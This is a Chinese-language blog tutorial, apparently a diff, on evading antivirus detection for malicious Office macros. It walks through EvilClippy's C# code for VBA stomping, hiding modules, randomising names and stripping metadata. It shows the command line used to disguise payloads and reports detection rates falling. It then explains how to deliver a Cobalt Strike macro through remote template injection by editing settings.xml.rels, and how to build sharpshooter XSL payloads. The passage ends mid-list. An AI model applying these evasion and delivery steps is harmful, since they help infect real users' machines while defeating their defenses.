+<p><a href="https://github.com/rossknudsen/Kavod.Vba.Compression#kavodvbacompression">https://github.com/rossknudsen/Kavod.Vba.Compression#kavodvbacompression</a></p>
+<p>NDesk.Options是基于回调对C#中的一些集合初始化器等提供简洁的解析规范的组件，目前支持VS2008-2017，Github仓库地址如下：</p>
+<p><a href="https://github.com/Latency/NDesk.Options">https://github.com/Latency/NDesk.Options</a></p>
+<p>接下来分析主要代码，其中一共三个公共类</p>
+<p>MSOfficeManipulator，ModuleInformation，WebServer</p>
+<p>从命名上来看比较规范，功能也较为容易理解，分别是对Office的操作，模块的信息读写还有web服务器访问。</p>
+<p>其中的代码注释也写得非常详细，几乎是看一眼就能看懂。</p>
+<p><img src="../img/2.png" alt=""></p>
+<p>我们主要来看其中的主要文件处理部分，首先通过如下代码实现文件流的读取</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>CFStorage commonStorage = cf.RootStorage; <span style="color:#75715e">// docm or xlsm</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cf.RootStorage.TryGetStorage(<span style="color:#e6db74">&#34;Macros&#34;</span>) != <span style="color:#66d9ef">null</span>) commonStorage = cf.RootStorage.GetStorage(<span style="color:#e6db74">&#34;Macros&#34;</span>); <span style="color:#75715e">// .doc</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cf.RootStorage.TryGetStorage(<span style="color:#e6db74">&#34;_VBA_PROJECT_CUR&#34;</span>) != <span style="color:#66d9ef">null</span>) commonStorage = cf.RootStorage.GetStorage(<span style="color:#e6db74">&#34;_VBA_PROJECT_CUR&#34;</span>); <span style="color:#75715e">// xls		</span>
+</span></span><span style="display:flex;"><span>vbaProjectStream = commonStorage.GetStorage(<span style="color:#e6db74">&#34;VBA&#34;</span>).GetStream(<span style="color:#e6db74">&#34;_VBA_PROJECT&#34;</span>).GetData();
+</span></span><span style="display:flex;"><span>projectStream = commonStorage.GetStream(<span style="color:#e6db74">&#34;project&#34;</span>).GetData();
+</span></span><span style="display:flex;"><span>projectwmStream = commonStorage.GetStream(<span style="color:#e6db74">&#34;projectwm&#34;</span>).GetData();
+</span></span><span style="display:flex;"><span>dirStream = Decompress(commonStorage.GetStorage(<span style="color:#e6db74">&#34;VBA&#34;</span>).GetStream(<span style="color:#e6db74">&#34;dir&#34;</span>).GetData());
+</span></span></code></pre></div><p>读取后将流转换为string格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">string</span> projectStreamString = System.Text.Encoding.UTF8.GetString(projectStream);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">string</span> projectwmStreamString = System.Text.Encoding.UTF8.GetString(projectwmStream);
+</span></span></code></pre></div><p>对文件中所有的VBA模块进行查找</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>List&lt;ModuleInformation&gt; vbaModules = ParseModulesFromDirStream(dirStream);
+</span></span></code></pre></div><p>替换VBA流中的Office版本信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (targetOfficeVersion != <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	ReplaceOfficeVersionInVBAProject(vbaProjectStream, targetOfficeVersion);
+</span></span><span style="display:flex;"><span>	commonStorage.GetStorage(<span style="color:#e6db74">&#34;VBA&#34;</span>).GetStream(<span style="color:#e6db74">&#34;_VBA_PROJECT&#34;</span>).SetData(vbaProjectStream);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>将ProjectProtectionState和ProjectVisibilityState设置为锁定/不可见(这就是隐藏自身的一种手段了，不过该选项可由用户设置，同理下面还有可见和不锁定的设置)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (optionUnviewableVBA)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">string</span> tmpStr = Regex.Replace(projectStreamString, <span style="color:#e6db74">&#34;CMG=\&#34;.*\&#34;&#34;</span>, <span style="color:#e6db74">&#34;CMG=\&#34;\&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">string</span> newProjectStreamString = Regex.Replace(tmpStr ,<span style="color:#e6db74">&#34;GC=\&#34;.*\&#34;&#34;</span>, <span style="color:#e6db74">&#34;GC=\&#34;\&#34;&#34;</span> );
+</span></span><span style="display:flex;"><span>        commonStorage.GetStream(<span style="color:#e6db74">&#34;project&#34;</span>).SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>其中ProjectProtectionState在官方文档中给出的解释为Specifies whether access to the VBA project was restricted by the user, the VBA host application, or the VBA project editor.即限制用户，VBA主机程序以及VBA编辑器对特定项目的访问。ProjectVisibilityState则为项目的可见性。</p>
+<p>还有在GUI中隐藏模块的代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (optionHideInGUI)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">var</span> vbaModule <span style="color:#66d9ef">in</span> vbaModules)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ((vbaModule.moduleName != <span style="color:#e6db74">&#34;ThisDocument&#34;</span>) &amp;&amp; (vbaModule.moduleName != <span style="color:#e6db74">&#34;ThisWorkbook&#34;</span>))
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				Console.WriteLine(<span style="color:#e6db74">&#34;Hiding module: &#34;</span> + vbaModule.moduleName);
+</span></span><span style="display:flex;"><span>				projectStreamString = projectStreamString.Replace(<span style="color:#e6db74">&#34;Module=&#34;</span> + vbaModule.moduleName, <span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>commonStorage.GetStream(<span style="color:#e6db74">&#34;project&#34;</span>).SetData(Encoding.UTF8.GetBytes(projectStreamString));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>另外，脚本会通过VBA stomp的方式来隐藏一些特征，VBA Stomp会销毁源码而只在文档中留下编译后的代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (VBASourceFileName != <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">byte</span>[] streamBytes;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">var</span> vbaModule <span style="color:#66d9ef">in</span> vbaModules)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		DebugLog(<span style="color:#e6db74">&#34;VBA module name: &#34;</span> + vbaModule.moduleName + <span style="color:#e6db74">&#34;\nOffset for code: &#34;</span> + vbaModule.textOffset);
+</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> (targetModules.Contains(vbaModule.moduleName) || !targetModules.Any())
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			Console.WriteLine(<span style="color:#e6db74">&#34;Now stomping VBA code in module: &#34;</span> + vbaModule.moduleName);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			streamBytes = commonStorage.GetStorage(<span style="color:#e6db74">&#34;VBA&#34;</span>).GetStream(vbaModule.moduleName).GetData();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			DebugLog(<span style="color:#e6db74">&#34;Existing VBA source:\n&#34;</span> + GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset));
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">string</span> newVBACode = <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (VBASourceFileName != <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">try</span>
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					newVBACode = System.IO.File.ReadAllText(VBASourceFileName);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">catch</span> (Exception e)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					Console.WriteLine(<span style="color:#e6db74">&#34;ERROR: Could not open VBA source file &#34;</span> + VBASourceFileName);
+</span></span><span style="display:flex;"><span>					Console.WriteLine(<span style="color:#e6db74">&#34;Please make sure this file exists and contains ASCII only characters.&#34;</span>);
+</span></span><span style="display:flex;"><span>					Console.WriteLine();
+</span></span><span style="display:flex;"><span>					Console.WriteLine(e.Message);
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		    DebugLog(<span style="color:#e6db74">&#34;Replacing with VBA code:\n&#34;</span> + newVBACode);
+</span></span><span style="display:flex;"><span>			streamBytes = ReplaceVBATextInModuleStream(streamBytes, vbaModule.textOffset, newVBACode);
+</span></span><span style="display:flex;"><span>			DebugLog(<span style="color:#e6db74">&#34;Hex dump of VBA module stream &#34;</span> + vbaModule.moduleName + <span style="color:#e6db74">&#34;:\n&#34;</span> + Utils.HexDump(streamBytes));				 		commonStorage.GetStorage(<span style="color:#e6db74">&#34;VBA&#34;</span>).GetStream(vbaModule.moduleName).SetData(streamBytes);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>同时，里面还包含了相关的对地址流进行操作的代码，程序会在地址流中给模块名随机赋ASCII名同时完整保留unicode名称</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (optionSetRandomNames)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	Console.WriteLine(<span style="color:#e6db74">&#34;Setting random ASCII names for VBA modules in dir stream (while leaving unicode names intact).&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Recompress and write to dir stream</span>
+</span></span><span style="display:flex;"><span>		commonStorage.GetStorage(<span style="color:#e6db74">&#34;VBA&#34;</span>).GetStream(<span style="color:#e6db74">&#34;dir&#34;</span>).SetData(Compress(SetRandomNamesInDirStream(dirStream)));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>以下为删除文件中的元数据部分的代码，用于清楚元数据使恶意标识不被轻易发现</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (optionDeleteMetadata)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		cf.RootStorage.Delete(<span style="color:#e6db74">&#34;\u0005SummaryInformation&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">catch</span> (Exception e)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		Console.WriteLine(<span style="color:#e6db74">&#34;ERROR: metadata stream does not exist (option ignored)&#34;</span>);
+</span></span><span style="display:flex;"><span>		DebugLog(e.Message);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>再来看看对地址流的操作，结合之前的随机赋值操作，通过偏移的方式提升寻址的难度，作者还在其中注释控诉了微软的某些愚蠢行为，无法理解一些格式&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] SetRandomNamesInDirStream(<span style="color:#66d9ef">byte</span>[] dirStream)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 2.3.4.2 dir Stream: Version Independent Project Information</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Dir stream is ALWAYS in little endian</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> offset = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	UInt16 tag;
+</span></span><span style="display:flex;"><span>	UInt32 wLength;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (offset &lt; dirStream.Length)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		tag = GetWord(dirStream, offset);
+</span></span><span style="display:flex;"><span>		wLength = GetDoubleWord(dirStream, offset + <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// The following idiocy is because Microsoft can&#39;t stick to their own format specification - taken from Pcodedmp</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (tag == <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>			wLength = <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (tag == <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>			wLength = <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> (tag)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">26</span>: <span style="color:#75715e">// 2.3.4.2.3.2.3 MODULESTREAMNAME Record</span>
+</span></span><span style="display:flex;"><span>				System.Text.UTF8Encoding encoding = <span style="color:#66d9ef">new</span> System.Text.UTF8Encoding();
+</span></span><span style="display:flex;"><span>				encoding.GetBytes(Utils.RandomString((<span style="color:#66d9ef">int</span>)wLength), <span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">int</span>)wLength, dirStream, (<span style="color:#66d9ef">int</span>)offset + <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		offset += <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>		offset += (<span style="color:#66d9ef">int</span>)wLength;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> dirStream;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>为了防止找不到对应的模块，在后面自然也有解析的代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> List&lt;ModuleInformation&gt; ParseModulesFromDirStream(<span style="color:#66d9ef">byte</span>[] dirStream)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 2.3.4.2 dir Stream: Version Independent Project Information</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Dir stream is ALWAYS in little endian</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	List&lt;ModuleInformation&gt; modules = <span style="color:#66d9ef">new</span> List&lt;ModuleInformation&gt;();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> offset = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	UInt16 tag;
+</span></span><span style="display:flex;"><span>	UInt32 wLength;
+</span></span><span style="display:flex;"><span>	ModuleInformation currentModule = <span style="color:#66d9ef">new</span> ModuleInformation { moduleName = <span style="color:#e6db74">&#34;&#34;</span>, textOffset = <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (offset &lt; dirStream.Length)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		tag = GetWord(dirStream, offset);
+</span></span><span style="display:flex;"><span>		wLength = GetDoubleWord(dirStream, offset + <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// The following idiocy is because Microsoft can&#39;t stick to their own format specification - taken from Pcodedmp</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (tag == <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>			wLength = <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (tag == <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>			wLength = <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> (tag)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">26</span>: <span style="color:#75715e">// 2.3.4.2.3.2.3 MODULESTREAMNAME Record</span>
+</span></span><span style="display:flex;"><span>				currentModule.moduleName = System.Text.Encoding.UTF8.GetString(dirStream, (<span style="color:#66d9ef">int</span>)offset + <span style="color:#ae81ff">6</span>, (<span style="color:#66d9ef">int</span>)wLength);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">49</span>: <span style="color:#75715e">// 2.3.4.2.3.2.5 MODULEOFFSET Record</span>
+</span></span><span style="display:flex;"><span>				currentModule.textOffset = GetDoubleWord(dirStream, offset + <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>				modules.Add(currentModule);
+</span></span><span style="display:flex;"><span>				currentModule = <span style="color:#66d9ef">new</span> ModuleInformation { moduleName = <span style="color:#e6db74">&#34;&#34;</span>, textOffset = <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		offset += <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>		offset += (<span style="color:#66d9ef">int</span>)wLength;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> modules;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在web server类中就是启动HTTP服务器进行监听，这个服务器的功能不是获取回连的shell，而只是用于VBA stomping，它会自动匹配目标的Office版本（使用其HTTP标头，然后相应地设置_VBA_PROJECT字节）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">WebServer</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">readonly</span> HttpListener _listener = <span style="color:#66d9ef">new</span> HttpListener();
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">readonly</span> Func&lt;HttpListenerRequest, <span style="color:#66d9ef">byte</span>[]&gt; _responderMethod;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> WebServer(Func&lt;HttpListenerRequest, <span style="color:#66d9ef">byte</span>[]&gt; method, <span style="color:#66d9ef">params</span> <span style="color:#66d9ef">string</span>[] prefixes)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (!HttpListener.IsSupported)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NotSupportedException(<span style="color:#e6db74">&#34;Needs Windows XP SP2, Server 2003 or later.&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// URI prefixes are required, for example &#34;http://localhost:8080/index/&#34;.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (prefixes == <span style="color:#66d9ef">null</span> || prefixes.Length == <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> ArgumentException(<span style="color:#e6db74">&#34;prefixes&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// A responder method is required</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (method == <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> ArgumentException(<span style="color:#e6db74">&#34;method&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">string</span> s <span style="color:#66d9ef">in</span> prefixes)
+</span></span><span style="display:flex;"><span>			_listener.Prefixes.Add(s);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		_responderMethod = method;
+</span></span><span style="display:flex;"><span>		_listener.Start();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> Run()
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		ThreadPool.QueueUserWorkItem((o) =&gt;
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			Console.WriteLine(<span style="color:#e6db74">&#34;Webserver running...&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">while</span> (_listener.IsListening)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					ThreadPool.QueueUserWorkItem((c) =&gt;
+</span></span><span style="display:flex;"><span>					{
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">var</span> ctx = c <span style="color:#66d9ef">as</span> HttpListenerContext;
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">try</span>
+</span></span><span style="display:flex;"><span>						{
+</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">byte</span>[] buf = _responderMethod(ctx.Request);
+</span></span><span style="display:flex;"><span>							ctx.Response.ContentLength64 = buf.Length;
+</span></span><span style="display:flex;"><span>							ctx.Response.OutputStream.Write(buf, <span style="color:#ae81ff">0</span>, buf.Length);
+</span></span><span style="display:flex;"><span>						}
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">catch</span> { } <span style="color:#75715e">// suppress any exceptions</span>
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">finally</span>
+</span></span><span style="display:flex;"><span>						{
+</span></span><span style="display:flex;"><span>							<span style="color:#75715e">// always close the stream</span>
+</span></span><span style="display:flex;"><span>							ctx.Response.OutputStream.Close();
+</span></span><span style="display:flex;"><span>						}
+</span></span><span style="display:flex;"><span>					}, _listener.GetContext());
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">catch</span> { } <span style="color:#75715e">// suppress any exceptions</span>
+</span></span><span style="display:flex;"><span>		});
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> Stop()
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		_listener.Stop();
+</span></span><span style="display:flex;"><span>		_listener.Close();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="功能演示">功能演示</h4>
+<p>在进行免杀操作时常用-s参数，通过加载一个其他正常脚本来混淆，避免被杀软直接识别到，因此我们准备一个正常脚本，然后执行命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>EvilClippy.exe -s novirus.vba Doc1.doc
+</span></span></code></pre></div><p>此时可以发现两个文档的检出率都大大降低</p>
+<p><img src="../img/9.png" alt="image-20201104185411333"></p>
+<p><img src="../img/10.png" alt="image-20201104185338605"></p>
+<p>再加入了随机地址后规避了一款扫描器的识别，跟据官方文档的描述，此举在欺骗pcodedmp 和 VirusTotal 时非常有效</p>
+<p><img src="../img/11.png" alt="image-20201104192304419"></p>
+<p>此外，在官方文档中，我们可以看到加入-g参数来隐藏GUI，之后的文档在试图编辑宏时会直接闪退，以下为演示录屏：</p>
+<p><img src="../img/1.gif" alt=""></p>
+<p>而在-u参数锁定时则打开后无法编辑，显示工程被锁定：</p>
+<p><img src="../img/2.gif" alt=""></p>
+<h3 id="远程加载">远程加载</h3>
+<p>远程加载作为一种较为有效的上线方式，通常可以绕过大部分杀软的查杀，首先讲一下基础的远程加载上线过程。</p>
+<h4 id="word直接远程调用">word直接远程调用</h4>
+<p>首先还是通过cs生成宏病毒保存成模板y1.dotm，将模板上传到公网能访问的地址，确保可以直接访问</p>
+<p><img src="../img/14.png" alt=""></p>
+<p>之后在本地新建文件，加载一个默认office模板后保存为正常的DOCX，由于新版本的office中的docx其实是一个压缩包，作为一个CTF选手看过文件头都会发现和ZIP文件头完全一样，因此我们通过修改后缀的方式进行解压</p>
+<p><img src="../img/15.png" alt="image-20201105151546336"></p>
+<p>之后再其中目录下的word&gt;_rels&gt;settings.xml.rels中进行修改，将原本的模板地址改为我们的远程地址</p>
+<p><img src="../img/16.png" alt=""></p>
+<p>之后再重新压缩，保存为docx文档后投放到目标机，加载的时候会有一个一闪而逝的下载过程，不过大部分人不会注意</p>
+<p><img src="../img/17.png" alt="image-20201105151923738"></p>
+<p>之后还是诱导点击，启用宏，即可再CS中实现上线</p>
+<p><img src="../img/18.png" alt=""></p>
+<p>可以看到在bypass AV时的能力还是非常优秀的</p>
+<p><img src="../img/19.png" alt="image-20201105152701637"></p>
+<p><img src="../img/13.png" alt="image-20201105151140899"></p>
+<h4 id="xsl远程调用">XSL远程调用</h4>
+<p>除了常规方法之外APT组织的攻击通常会采取更高级的攻击手段，通过钓鱼框架来实现更为隐蔽的远程加载，接下来讲讲XSL远程加载的宏免杀方式。</p>
+<p>XSL是指扩展样式表语言（<em>E</em>Xtensible <em>S</em>tylesheet <em>L</em>anguage），通过XSL执行的方式有时可以绕过APPLocker执行一些命令，常见的加载方式为MSXSL和wmic</p>
+<p>首先我们生成一个恶意XSL文件，可以先通过CS或MSF生成bin格式的payload，之后进行编码，因为我们通过sharpshooter生成XSL文件时不能带有空格因此需要编码。编码完成后通过sharpshooter生成宏和远程XSL文件。</p>
+<p><img src="../img/20.png" alt=""></p>
+<p>对XSL文件的远程加载方式主要如下：</p>
+<ol>
+<li>通过msxsl直接调用（msxsl可能需要从微软官网下载）：</li>
+</ol>
